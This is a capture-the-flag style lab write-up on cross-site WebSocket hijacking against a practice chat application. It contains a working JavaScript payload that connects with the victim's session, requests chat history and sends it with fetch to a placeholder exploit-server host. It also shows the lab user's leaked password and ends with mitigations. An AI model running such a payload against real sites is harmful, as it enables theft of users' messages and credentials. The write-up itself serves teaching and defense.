# Lab: Cross-site WebSocket hijacking


## Overview



**Cross-site WebSocket hijacking (CSWSH)** is a vulnerability that occurs when a WebSocket connection relies on the 
victim's **session cookie** for authentication without sufficient **CSRF protection**.



In this situation, an attacker can host a malicious page that establishes a WebSocket connection using the victim's 
authenticated session and then interact with the WebSocket to read sensitive data returned by the server.



Unlike traditional CSRF, WebSockets provide **two-way communication**, allowing the attacker to both send messages and 
receive responses.



---



## Lab Goal



Use the **Exploit Server** to:



1. Establish a WebSocket connection using the victim's session.

2. Send the `READY` command.

3. Retrieve the victim's chat history.

4. Exfiltrate the messages.

5. Extract the victim's credentials.

6. Use the credentials to log in as Carlos.



---



## 1. Identifying the WebSocket



I opened **Live chat**, sent a message, and reloaded the page.



In:



**Burp → Proxy → WebSockets history**



I noticed that sending:



```text

READY

```



caused the server to return previous chat messages.



---



## 2. Inspecting the WebSocket Handshake



In:



**Burp → Proxy → HTTP history**



I found the WebSocket handshake:



```http

GET /chat HTTP/2

Host: YOUR-LAB-ID.web-security-academy.net

Upgrade: websocket

Cookie: session=...

```



The handshake relied on the session cookie for authentication but did not contain a **CSRF token**.



The WebSocket endpoint was:



```text

wss://YOUR-LAB-ID.web-security-academy.net/chat

```



---



## 3. Creating the Exploit



I used the Exploit Server to host the following JavaScript payload:



```javascript

<script>

var ws = new WebSocket(

    "wss://YOUR-LAB-ID.web-security-academy.net/chat"

);



ws.onopen = function () {

    ws.send("READY");

};



ws.onmessage = function (event) {

    fetch(

        "https://YOUR-EXPLOIT-SERVER/exploit?message=" +

        btoa(event.data)

    );

};

</script>

```



### Payload Breakdown



#### Create the WebSocket connection



```javascript

var ws = new WebSocket("wss://...");

```



Creates a WebSocket connection to the vulnerable chat endpoint.



#### Send `READY`



```javascript

ws.onopen = function () {

    ws.send("READY");

};

```



Once the connection is established, the payload sends `READY` to request the previous chat history.



#### Receive WebSocket messages



```javascript

ws.onmessage = function (event)

```



Handles messages received from the WebSocket server.



#### Encode the data



```javascript
btoa(event.data)

```



Encodes the received message using Base64.



#### Exfiltrate the data



```javascript

fetch(...)

```



Sends the received WebSocket data to the Exploit Server.



---



## 4. Testing the Exploit



I clicked:



**View exploit**



Then I checked the requests received by the Exploit Server.



The chat messages were received as Base64-encoded data.



After decoding one of the messages:



```json

{

  "user": "Hal Pline",

  "content": "Hello, how can I help?"

}

```



Another message was:



```json

{

  "user": "You",

  "content": "I forgot my password"

}

```



This confirmed that the exploit was successfully retrieving the chat history.



---



## 5. Delivering the Exploit



After confirming that the exploit worked, I used:



**Exploit Server → Deliver exploit to victim**



I then checked the incoming interactions again.



Additional messages containing the victim's chat history were received.



---





## 6. Extracting the Credentials



One of the messages contained Carlos's password:



```json

{

  "user": "Hal Pline",

  "content": "No problem carlos, it's xg7kaxkxqn3ykifsljhv"

}

```



The credentials were:



```text

Username: carlos

Password: xg7kaxkxqn3ykifsljhv

```



I used these credentials to log in as Carlos and successfully solved the lab.



---



## Key Takeaways



* WebSockets provide persistent **two-way communication**.

* WebSocket handshakes may rely on session cookies for authentication.

* Missing CSRF protection can lead to **Cross-site WebSocket hijacking**.

* The `READY` command exposed the previous chat history.

* WebSocket messages may contain sensitive information.

* Client-side JavaScript can be used to exfiltrate data received through a vulnerable WebSocket connection.

* Sensitive information should not be exposed through WebSockets without proper authentication and authorization.



## Attack Flow



```text

Malicious Page

      ↓

Victim's Browser

      ↓

WebSocket Connection

      ↓

Target Server

      ↓

READY

      ↓


Chat History

      ↓

Base64 Encoding

      ↓

Data Exfiltration

      ↓

Attacker

      ↓

Victim's Credentials

      ↓


Account Takeover


```



## Mitigation



* Implement appropriate CSRF protection for WebSocket handshakes.

* Validate the `Origin` header server-side.

* Use proper authentication and authorization mechanisms.

* Avoid exposing sensitive information through WebSocket messages without proper authorization.

